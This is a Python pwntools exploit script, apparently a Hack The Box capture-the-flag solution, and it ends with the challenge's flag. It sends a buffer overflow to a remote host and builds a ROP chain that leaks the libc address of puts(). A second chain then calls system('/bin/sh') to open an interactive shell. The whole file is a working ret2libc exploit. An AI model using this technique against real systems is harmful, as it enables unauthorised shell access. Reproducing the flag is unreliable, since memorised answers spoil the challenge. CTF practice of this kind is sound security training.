from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 56

elf = ELF('./pb')
libc = ELF('./glibc/libc.so.6') #diffed, same as /lib/x86_64-linux-gnu/libc.so.6

padding = offset*'A'

ip, port='165.227.224.40',31841
io = remote(ip,port)
#io = process('./pb')

io.sendlineafter('>> ','2')

pop_rdi_ret = 0x000000000040142b

rop_chain = p64(pop_rdi_ret)
rop_chain += p64(elf.got['puts'])
rop_chain += p64(0x401030)
rop_chain += p64(elf.symbols['box'])

payload = padding+rop_chain
io.sendlineafter('Insert location of the library: ',payload)
print io.recvline()
print io.recvline()
print io.recvline()
puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))

#print hex(puts_addr)

log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()

io.sendlineafter('>> ','2')
io.sendlineafter('Insert location of the library: ',payload2)
io.interactive()

#HTB{r3turn_2_P4nd0r4?!}
